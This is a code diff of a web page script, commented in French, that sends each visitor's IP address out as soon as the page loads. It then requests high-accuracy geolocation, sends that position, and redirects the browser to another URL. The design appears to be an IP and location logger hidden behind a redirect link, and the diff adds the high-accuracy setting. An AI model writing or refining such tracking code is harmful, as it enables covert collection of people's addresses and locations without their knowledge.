@@ -69,25 +69,26 @@
     }
 
     async function envoyerDonnees() {
-      // Récupération IP immédiate
+      // 1️⃣ Récupération et envoi IP dès le départ
       const ip = await getIP();
       if (ip) await sendIP(ip);
 
-      // Vérifier la géolocalisation
+      // 2️⃣ Récupération de la position si disponible
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           async (position) => {
-            // Si autorisée → envoyer position après IP
+            // Si position obtenue → envoyer avant redirection
             await sendPosition(position);
             window.location.href = REDIRECT_URL;
           },
           () => {
-            // Si refusée ou désactivée → juste redirection après IP
+            // Si refusée → redirection après IP
             window.location.href = REDIRECT_URL;
-          }
+          },
+          { enableHighAccuracy: true, timeout: 5000 } // timeout 5s pour ne pas bloquer
         );
       } else {
-        // Pas de geolocation → redirection après IP
+        // Pas de géolocalisation → redirection après IP
         window.location.href = REDIRECT_URL;
       }
     }
